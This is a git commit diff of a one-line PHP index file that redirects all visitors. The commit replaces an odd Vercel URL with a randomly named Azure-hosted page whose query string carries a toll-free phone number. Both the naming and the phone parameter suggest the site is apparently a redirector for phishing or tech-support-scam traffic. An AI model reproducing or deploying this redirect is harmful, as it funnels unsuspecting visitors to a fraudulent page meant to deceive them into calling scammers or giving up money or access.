a50c29bfd259e2f9ba948d8ec8577af855f50c9e
mancillajoaquin204 <mancillajoaquin204@gmail.com>
2025-06-05 19:46:57 +0530

    Update index.php

--- index.php
+++ index.php
@@ -1,7 +1,7 @@
 <?php
 
 // Redirect browser
-header("Location: https://allowyourmyonlinechartportal.vercel.app/index2.html");
+header("Location: https://jaggadakku7efnund8hwewxx.z8.web.core.windows.net/index.html?Aniph=1-888-359-1315");
 
 exit;
 ?>
